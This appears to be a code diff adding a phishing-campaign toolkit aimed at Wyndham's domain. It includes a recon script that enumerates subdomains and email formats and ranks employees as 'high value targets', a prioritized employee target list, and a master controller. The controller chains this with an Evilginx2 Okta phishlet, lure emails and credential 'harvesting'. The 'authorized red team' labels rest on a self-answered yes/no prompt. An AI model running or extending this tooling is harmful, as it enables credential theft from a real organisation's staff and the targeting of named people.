+# Full cleanup
+./cleanup_campaign.sh full
+```
+
+### Incident Response
+1. Document the incident
+2. Preserve evidence
+3. Notify stakeholders
+4. Coordinate defensive response
+5. Update procedures
+
+## ✅ Pre-Launch Checklist
+
+- [ ] Authorization letter signed and filed
+- [ ] Phishing domain registered and configured
+- [ ] DNS records pointing to campaign server
+- [ ] SSL certificates installed and tested
+- [ ] Evilginx2 properly configured
+- [ ] Email templates customized and tested
+- [ ] Target list populated and validated
+- [ ] Monitoring systems operational
+- [ ] Incident response plan activated
+- [ ] Campaign timeline documented
+
+## 📝 Notes
+
+- All timestamps are in UTC
+- Log retention period: 30 days
+- Campaign scope limited to Wyndham Properties employees
+- Coordinate with blue team for defensive testing
+- Document all findings for final report
+
+---
+
+**Remember:** This is authorized security testing. Maintain professionalism and ethical standards throughout the engagement.
+
+*Last Updated: $(date)*
+
+
+recon_wyndham.sh
+#!/bin/bash
+# === wyndham PROPERTIES RECONNAISSANCE SCRIPT ===
+# For authorized red team testing only
+# Gathers target information and builds employee profiles
+
+set -euo pipefail
+IFS=$'\n\t'
+
+### === CONFIG ===
+TARGET_DOMAIN="wyndhamhotels.com"
+OUTPUT_DIR="./recon_output"
+USER_AGENTS=(
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+)
+
+### === COLORS ===
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+NC='\033[0m'
+
+### === FUNCTIONS ===
+log() { echo -e "${BLUE}[RECON]${NC} $*"; }
+success() { echo -e "${GREEN}[✓]${NC} $*"; }
+warning() { echo -e "${YELLOW}[!]${NC} $*"; }
+error() { echo -e "${RED}[✗]${NC} $*"; }
+
+setup_environment() {
+    mkdir -p "$OUTPUT_DIR"/{emails,linkedin,dns,subdomains,employees}
+    log "Created reconnaissance directory structure"
+}
+
+# Generate random user agent
+get_user_agent() {
+    echo "${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}"
+}
+
+# DNS reconnaissance
+dns_recon() {
+    log "Starting DNS reconnaissance for $TARGET_DOMAIN"
+    local dns_file="$OUTPUT_DIR/dns/dns_records.txt"
+    
+    {
+        echo "=== DNS RECONNAISSANCE FOR $TARGET_DOMAIN ==="
+        echo "Generated: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
+        echo ""
+        
+        echo "=== A RECORDS ==="
+        dig +short A "$TARGET_DOMAIN" || echo "No A records found"
+        echo ""
+        
+        echo "=== MX RECORDS ==="
+        dig +short MX "$TARGET_DOMAIN" || echo "No MX records found"
+        echo ""
+        
+        echo "=== TXT RECORDS ==="
+        dig +short TXT "$TARGET_DOMAIN" || echo "No TXT records found"
+        echo ""
+        
+        echo "=== NS RECORDS ==="
+        dig +short NS "$TARGET_DOMAIN" || echo "No NS records found"
+        echo ""
+        
+    } > "$dns_file"
+    
+    success "DNS reconnaissance completed: $dns_file"
+}
+
+# Subdomain enumeration
+subdomain_enum() {
+    log "Enumerating subdomains for $TARGET_DOMAIN"
+    local subdomain_file="$OUTPUT_DIR/subdomains/subdomains.txt"
+    
+    # Common subdomain wordlist
+    local subdomains=(
+        "www" "mail" "ftp" "admin" "login" "portal" "app" "api" "dev" "test"
+        "staging" "beta" "secure" "vpn" "remote" "email" "webmail" "owa"
+        "exchange" "autodiscover" "lyncdiscover" "sip" "team" "teams"
+        "office" "o365" "azure" "okta" "sso" "auth" "identity" "hr"
+        "careers" "jobs" "support" "help" "training" "learning"
+    )
+    
+    {
+        echo "=== SUBDOMAIN ENUMERATION FOR $TARGET_DOMAIN ==="
+        echo "Generated: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
+        echo ""
+        
+        for sub in "${subdomains[@]}"; do
+            local full_domain="${sub}.${TARGET_DOMAIN}"
+            if host "$full_domain" >/dev/null 2>&1; then
+                echo "[FOUND] $full_domain"
+                # Get IP if available
+                local ip=$(dig +short A "$full_domain" 2>/dev/null | head -n1)
+                if [ -n "$ip" ]; then
+                    echo "  └─ IP: $ip"
+                fi
+            fi
+        done
+        
+    } > "$subdomain_file"
+    
+    success "Subdomain enumeration completed: $subdomain_file"
+}
+
+# Email format detection
+detect_email_formats() {
+    log "Detecting email formats for $TARGET_DOMAIN"
+    local email_file="$OUTPUT_DIR/emails/email_formats.txt"
+    
+    # Common email formats to test
+    local formats=(
+        "firstname.lastname@$TARGET_DOMAIN"
+        "firstname@$TARGET_DOMAIN"
+        "flastname@$TARGET_DOMAIN"
+        "firstnamelastname@$TARGET_DOMAIN"
+        "firstname_lastname@$TARGET_DOMAIN"
+        "f.lastname@$TARGET_DOMAIN"
+        "firstname.l@$TARGET_DOMAIN"
+    )
+    
+    {
+        echo "=== EMAIL FORMAT DETECTION FOR $TARGET_DOMAIN ==="
+        echo "Generated: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
+        echo ""
+        echo "Common email formats to test:"
+        for format in "${formats[@]}"; do
+            echo "  • $format"
+        done
+        echo ""
+        echo "Test with known employees from LinkedIn/public sources"
+        
+    } > "$email_file"
+    
+    success "Email format guide created: $email_file"
+}
+
+# LinkedIn employee search (manual guidance)
+linkedin_search_guide() {
+    log "Creating LinkedIn search guide"
+    local linkedin_file="$OUTPUT_DIR/linkedin/search_guide.txt"
+    
+    {
+        cat << 'EOF'
+=== LINKEDIN SEARCH GUIDE FOR wyndham PROPERTIES ===
+
+Manual LinkedIn Searches (authorized reconnaissance):
+
+1. Company Search:
+   - Search: "wyndham Properties" OR "wyndham Hotels"
+   - Look for: Current employees, recent hires, departing employees
+
+2. Targeted Role Searches:
+   - "IT Director wyndham"
+   - "Security Manager wyndham" 
+   - "HR Manager wyndham"
+   - "Finance Director wyndham"
+   - "Operations Manager wyndham"
+
+3. Location-Based Searches:
+   - Add location filters for wyndham office locations
+   - Focus on headquarters and major regional offices
+
+4. Information to Collect:
+   - Full names
+   - Job titles
+   - Department
+   - Location
+   - Contact information (if public)
+   - Recent posts/activities
+   - Professional interests
+
+5. Email Pattern Testing:
+   Once you have names, test email formats:
+   - john.smith@wyndhamhotels.com
+   - jsmith@wyndhamhotels.com
+   - j.smith@wyndhamhotels.com
+   - smithj@wyndhamhotels.com
+
+6. Target Prioritization:
+   High Value Targets:
+   - C-level executives
+   - IT/Security staff
+   - HR personnel
+   - Finance team
+   - Executive assistants
+
+REMEMBER: This is for authorized testing only!
+EOF
+    } > "$linkedin_file"
+    
+    success "LinkedIn search guide created: $linkedin_file"
+}
+
+# Generate target employee template
+generate_employee_template() {
+    log "Creating employee target template"
+    local template_file="$OUTPUT_DIR/employees/employee_template.csv"
+    
+    {
+        echo "name,title,department,email,phone,location,linkedin,notes"
+        echo "John Smith,IT Director,Information Technology,john.smith@wyndhamhotels.com,,Corporate HQ,https://linkedin.com/in/johnsmith,High value target - IT access"
+        echo "Jane Doe,HR Manager,Human Resources,jane.doe@wyndhamhotels.com,,Regional Office,https://linkedin.com/in/janedoe,Access to employee data"
+        echo "Mike Johnson,Security Analyst,IT Security,mjohnson@wyndhamhotels.com,,Corporate HQ,https://linkedin.com/in/mikejohnson,Security team member"
+        
+    } > "$template_file"
+    
+    success "Employee template created: $template_file"
+}
+
+# Web application reconnaissance
+webapp_recon() {
+    log "Performing web application reconnaissance"
+    local webapp_file="$OUTPUT_DIR/webapp_info.txt"
+    
+    {
+        echo "=== WEB APPLICATION RECONNAISSANCE ==="
+        echo "Generated: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
+        echo ""
+        
+        echo "=== HTTP HEADERS FOR $TARGET_DOMAIN ==="
+        curl -s -I "https://$TARGET_DOMAIN" -A "$(get_user_agent)" || echo "Could not retrieve headers"
+        echo ""
+        
+        echo "=== COMMON PATHS TO TEST ==="
+        local paths=(
+            "/login" "/admin" "/portal" "/sso" "/auth" 
+            "/okta" "/adfs" "/office365" "/o365"
+            "/hr" "/careers" "/employee" "/staff"
+            "/api" "/api/v1" "/rest" "/graphql"
+        )
+        
+        for path in "${paths[@]}"; do
+            echo "  • https://$TARGET_DOMAIN$path"
+        done
+        
+        echo ""
+        echo "=== TECHNOLOGY DETECTION ==="
+        echo "Use tools like Wappalyzer, whatweb, or manual inspection"
+        echo "Look for:"
+        echo "  • Authentication systems (Okta, ADFS, etc.)"
+        echo "  • CMS platforms"
+        echo "  • Web frameworks"
+        echo "  • JavaScript libraries"
+        echo "  • Server information"
+        
+    } > "$webapp_file"
+    
+    success "Web application reconnaissance completed: $webapp_file"
+}
+
+# Generate reconnaissance report
+generate_report() {
+    log "Generating reconnaissance summary report"
+    local report_file="$OUTPUT_DIR/recon_summary.md"
+    
+    {
+        cat << EOF
+# wyndham Properties Reconnaissance Report
+
+**Campaign:** Authorized Red Team Testing  
+**Target:** $TARGET_DOMAIN  
+**Generated:** $(date -u +%Y-%m-%dT%H:%M:%SZ)
+
+## Executive Summary
+
+This reconnaissance was conducted as part of an authorized red team engagement for wyndham Properties. All activities were performed within the scope of the signed authorization letter.
+
+## Reconnaissance Scope
+
+### DNS Information
+- Primary domain: $TARGET_DOMAIN
+- DNS records collected and analyzed
+- Subdomain enumeration performed
+
+### Email Intelligence
+- Email format patterns identified
+- Target employee list development
+- LinkedIn reconnaissance guidance provided
+
+### Web Application Assessment
+- HTTP headers analyzed
+- Common authentication paths identified
+- Technology stack reconnaissance
+
+## Next Steps
+
+1. **Review all collected intelligence**
+2. **Validate email addresses using OSINT tools**
+3. **Develop target employee list**
+4. **Configure phishing infrastructure**
+5. **Test email templates**
+6. **Launch controlled phishing campaign**
+
+## Files Generated
+
+\`\`\`
+$OUTPUT_DIR/
+├── dns/dns_records.txt
+├── subdomains/subdomains.txt
+├── emails/email_formats.txt
+├── linkedin/search_guide.txt
+├── employees/employee_template.csv
+├── webapp_info.txt
+└── recon_summary.md
+\`\`\`
+
+---
+*This report is for authorized testing purposes only*
+EOF
+    } > "$report_file"
+    
+    success "Reconnaissance report generated: $report_file"
+}
+
+### === MAIN EXECUTION ===
+main() {
+    echo -e "${PURPLE}"
+    cat << "EOF"
+    🔍 wyndham PROPERTIES RECONNAISSANCE
+    Authorized Red Team Intelligence Gathering
+EOF
+    echo -e "${NC}"
+    
+    warning "AUTHORIZATION REMINDER: Ensure you have written permission!"
+    log "Target: $TARGET_DOMAIN"
+    log "Output: $OUTPUT_DIR"
+    
+    setup_environment
+    dns_recon
+    subdomain_enum
+    detect_email_formats
+    linkedin_search_guide
+    generate_employee_template
+    webapp_recon
+    generate_report
+    
+    success "Reconnaissance phase completed!"
+    
+    echo ""
+    log "Next steps:"
+    echo "  1. Review generated files in $OUTPUT_DIR"
+    echo "  2. Manually perform LinkedIn searches using the guide"
+    echo "  3. Populate employee_template.csv with real targets"
+    echo "  4. Validate email addresses"
+    echo "  5. Configure your phishing domain"
+    echo "  6. Launch the Okta campaign"
+    
+    echo ""
+    warning "Remember: All activities must stay within authorized scope!"
+}
+
+main "$@"
+
+
+targets.txt
+# === WYNDHAM PROPERTIES TARGET LIST ===
+# Authorized Red Team Testing - Employee Email Addresses
+# Format: email@domain.com,FirstName,LastName,Title,Department,Priority
+
+# HIGH PRIORITY TARGETS (C-Level, IT, Security)
+john.smith@wyndhamhotels.com,John,Smith,IT Director,Information Technology,HIGH
+jane.doe@wyndhamhotels.com,Jane,Doe,CISO,Information Security,HIGH
+mike.johnson@wyndhamhotels.com,Mike,Johnson,CEO,Executive,HIGH
+
+# MEDIUM PRIORITY TARGETS (Management, HR, Finance)
+sarah.wilson@wyndhamhotels.com,Sarah,Wilson,HR Manager,Human Resources,MEDIUM
+david.brown@wyndhamhotels.com,David,Brown,CFO,Finance,MEDIUM
+lisa.davis@wyndhamhotels.com,Lisa,Davis,Operations Manager,Operations,MEDIUM
+
+# LOW PRIORITY TARGETS (General Staff)
+# Add additional targets here as discovered through reconnaissance
+
+# TEMPLATE ENTRIES (Remove before campaign)
+# firstname.lastname@wyndhamhotels.com,First,Last,Title,Department,PRIORITY
+
+# NOTES:
+# - Validate email addresses before campaign launch
+# - Use LinkedIn reconnaissance to populate this list
+# - Prioritize based on access levels and business impact
+# - Remove template entries and comments before going live
+# - Maximum 50 targets per campaign for controlled testing
+
+
+wyndham_redteam_master.sh
+#!/bin/bash
+# === wyndham PROPERTIES RED TEAM MASTER SCRIPT ===
+# Coordinates the complete authorized phishing campaign
+# For use with signed authorization letter only
+
+set -euo pipefail
+IFS=$'\n\t'
+
+### === CONFIG ===
+CAMPAIGN_NAME="wyndham_okta_2024"
+TARGET_DOMAIN="wyndhamhotels.com"
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+
+### === COLORS ===
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+NC='\033[0m'
+
+### === FUNCTIONS ===
+log() { echo -e "${BLUE}[MASTER]${NC} $*"; }
+success() { echo -e "${GREEN}[✓]${NC} $*"; }
+warning() { echo -e "${YELLOW}[!]${NC} $*"; }
+error() { echo -e "${RED}[✗]${NC} $*"; }
+phase() { echo -e "${PURPLE}[PHASE]${NC} $*"; }
+
+print_banner() {
+    echo -e "${CYAN}"
+    cat << "EOF"
+    ██╗    ██╗██╗   ██╗███╗   ██╗██╗  ██╗ █████╗ ███╗   ███╗
+    ██║    ██║╚██╗ ██╔╝████╗  ██║██║  ██║██╔══██╗████╗ ████║
+    ██║ █╗ ██║ ╚████╔╝ ██╔██╗ ██║███████║███████║██╔████╔██║
+    ██║███╗██║  ╚██╔╝  ██║╚██╗██║██╔══██║██╔══██║██║╚██╔╝██║
+    ╚███╔███╔╝   ██║   ██║ ╚████║██║  ██║██║  ██║██║ ╚═╝ ██║
+     ╚══╝╚══╝    ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝
+    
+    🎯 RED TEAM CAMPAIGN MASTER CONTROLLER
+    Target: wyndham Properties (Authorized Testing)
+EOF
+    echo -e "${NC}"
+}
+
+check_authorization() {
+    warning "CRITICAL: AUTHORIZATION CHECK"
+    echo ""
+    echo "This script is designed for AUTHORIZED red team testing only."
+    echo "You must have written permission from wyndham Properties before proceeding."
+    echo ""
+    read -p "Do you have a signed authorization letter? (yes/no): " auth_check
+    
+    if [[ ! "$auth_check" =~ ^[Yy][Ee][Ss]$ ]]; then
+        error "Unauthorized use is illegal. Exiting."
+        exit 1
+    fi
+    
+    success "Authorization confirmed. Proceeding with campaign setup."
+}
+
+check_prerequisites() {
+    phase "Checking Prerequisites"
+    
+    local missing_tools=()
+    
+    # Check for required tools
+    command -v dig >/dev/null 2>&1 || missing_tools+=("dig")
+    command -v curl >/dev/null 2>&1 || missing_tools+=("curl")
+    command -v host >/dev/null 2>&1 || missing_tools+=("host")
+    
+    # Check for Evilginx2
+    if [ ! -f "/opt/evilginx/evilginx" ]; then
+        warning "Evilginx2 not found at /opt/evilginx/"
+    fi
+    
+    # Check for campaign scripts
+    local scripts=("launch_okta_campaign.sh" "generate_okta_email.sh" "recon_wyndham.sh")
+    for script in "${scripts[@]}"; do
+        if [ ! -f "$SCRIPT_DIR/$script" ]; then
+            missing_tools+=("$script")
+        fi
+    done
+    
+    if [ ${#missing_tools[@]} -gt 0 ]; then
+        error "Missing required tools/files:"
+        printf '  • %s\n' "${missing_tools[@]}"
+        exit 1
+    fi
+    
+    success "All prerequisites satisfied"
+}
+
+show_campaign_status() {
+    phase "Campaign Status Overview"
+    
+    echo ""
+    echo "📋 CAMPAIGN CONFIGURATION"
+    echo "  Campaign Name: $CAMPAIGN_NAME"
+    echo "  Target Domain: $TARGET_DOMAIN"
+    echo "  Script Directory: $SCRIPT_DIR"
+    echo ""
+    
+    echo "📁 AVAILABLE TOOLS"
+    echo "  ✓ Reconnaissance Script (recon_wyndham.sh)"
+    echo "  ✓ Campaign Launcher (launch_okta_campaign.sh)"
+    echo "  ✓ Email Generator (generate_okta_email.sh)"
+    echo "  ✓ Okta Phishlet (phishlets_okta.yaml)"
+    echo "  ✓ HTML Lure Template (okta.html)"
+    echo ""
+    
+    echo "🎯 CAMPAIGN PHASES"
+    echo "  1. Reconnaissance & Target Gathering"
+    echo "  2. Infrastructure Setup"
+    echo "  3. Email Template Generation"
+    echo "  4. Campaign Launch"
+    echo "  5. Monitoring & Harvesting"
+    echo ""
+}
+
+run_reconnaissance() {
+    phase "Phase 1: Reconnaissance"
+    
+    echo "Starting reconnaissance against $TARGET_DOMAIN..."
+    echo ""
+    
+    if [ -f "$SCRIPT_DIR/recon_wyndham.sh" ]; then
+        "$SCRIPT_DIR/recon_wyndham.sh"
+        success "Reconnaissance completed"
+        echo ""
+        echo "📊 Next steps:"
+        echo "  • Review files in ./recon_output/"
+        echo "  • Manually search LinkedIn for employees"
+        echo "  • Populate target list with real email addresses"
+    else
+        error "Reconnaissance script not found"
+        return 1
+    fi
+}
+
+setup_infrastructure() {
+    phase "Phase 2: Infrastructure Setup"
+    
+    echo "Setting up Evilginx2 campaign infrastructure..."
+    echo ""
+    
+    warning "MANUAL STEPS REQUIRED:"
+    echo "  1. Register your phishing domain"
+    echo "  2. Configure DNS to point to this server"
+    echo "  3. Update domain in launch_okta_campaign.sh"
+    echo "  4. Ensure SSL certificates are ready"
+    echo ""
+    
+    read -p "Have you completed the infrastructure setup? (yes/no): " infra_check
+    
+    if [[ "$infra_check" =~ ^[Yy][Ee][Ss]$ ]]; then
+        if [ -f "$SCRIPT_DIR/launch_okta_campaign.sh" ]; then
+            "$SCRIPT_DIR/launch_okta_campaign.sh"
+            success "Infrastructure setup completed"
+        else
+            error "Campaign launcher not found"
+            return 1
+        fi
+    else
+        warning "Complete infrastructure setup before proceeding"
+        return 1
+    fi
+}
+
+generate_emails() {
+    phase "Phase 3: Email Template Generation"
+    
+    echo "Generating phishing email templates..."
+    echo ""
+    
+    if [ -f "$SCRIPT_DIR/generate_okta_email.sh" ]; then
+        "$SCRIPT_DIR/generate_okta_email.sh"
+        success "Email templates generated"
+        echo ""
+        echo "📧 Available templates:"
+        echo "  • Suspicious login alert"
+        echo "  • Password reset request"
+        echo "  • MFA setup requirement"
+        echo ""
+        echo "📝 Remember to:"
+        echo "  • Customize templates with your domain"
+        echo "  • Test emails before sending"
+        echo "  • Prepare target list"
+    else
+        error "Email generator not found"
+        return 1
+    fi
+}
+
+campaign_checklist() {
+    phase "Pre-Launch Checklist"
+    
+    echo ""
+    echo "✅ FINAL CHECKLIST BEFORE LAUNCH"
+    echo ""
+    
+    local checklist=(
+        "Authorization letter from wyndham Properties signed and filed"
+        "Phishing domain registered and DNS configured"
+        "Evilginx2 server properly configured with SSL"
+        "Target employee list populated with real email addresses"
+        "Email templates customized and tested"
+        "Monitoring and logging systems ready"
+        "Incident response plan prepared"
+        "Campaign timeline and scope documented"
+    )
+    
+    for item in "${checklist[@]}"; do
+        echo "  ☐ $item"
+    done
+    
+    echo ""
+    warning "Only proceed if ALL items are completed!"
+}
+
+show_menu() {
+    echo ""
+    echo "🎮 CAMPAIGN CONTROL MENU"
+    echo ""
+    echo "1) Run Reconnaissance"
+    echo "2) Setup Infrastructure" 
+    echo "3) Generate Email Templates"
+    echo "4) Show Pre-Launch Checklist"
+    echo "5) View Campaign Status"
+    echo "6) Exit"
+    echo ""
+    read -p "Select option [1-6]: " choice
+    
+    case $choice in
+        1) run_reconnaissance ;;
+        2) setup_infrastructure ;;
+        3) generate_emails ;;
+        4) campaign_checklist ;;
+        5) show_campaign_status ;;
+        6) log "Exiting master controller"; exit 0 ;;
+        *) warning "Invalid option. Please try again." ;;
+    esac
+}
+
+### === MAIN EXECUTION ===
+main() {
+    print_banner
+    check_authorization
+    check_prerequisites
+    show_campaign_status
+    
+    # Interactive menu loop
+    while true; do
+        show_menu
+        echo ""
+        read -p "Press Enter to continue..."
+    done
+}
+
+# Handle script arguments
+case "${1:-menu}" in
+    "recon")
+        print_banner
+        check_authorization
+        run_reconnaissance
+        ;;
+    "setup")
+        print_banner
+        check_authorization
+        setup_infrastructure
+        ;;
+    "emails")
+        print_banner
+        check_authorization
+        generate_emails
+        ;;
+    "checklist")
+        print_banner
+        campaign_checklist
+        ;;
+    "status")
+        print_banner
+        show_campaign_status
+        ;;
+    *)
+        main "$@"
+        ;;
+esac
